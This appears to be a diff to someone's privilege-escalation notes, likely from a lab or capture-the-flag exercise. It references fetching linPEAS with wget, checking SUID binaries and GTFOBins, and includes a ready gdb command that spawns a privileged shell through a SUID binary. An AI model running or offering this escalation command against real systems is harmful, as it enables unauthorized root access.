@@ -15,11 +15,17 @@ wget http://localserver:port/linpeas.sh
 # find 
  (Files with Interesting Permissions)
  [SUID]
- 
- 
- # next command 
+
+
+
+# used to find exploit (gdb)
+
+https://gtfobins.github.io/
+
+
+# next command 
  /usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
  
- whoiam
+ # whoiam
 
 https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
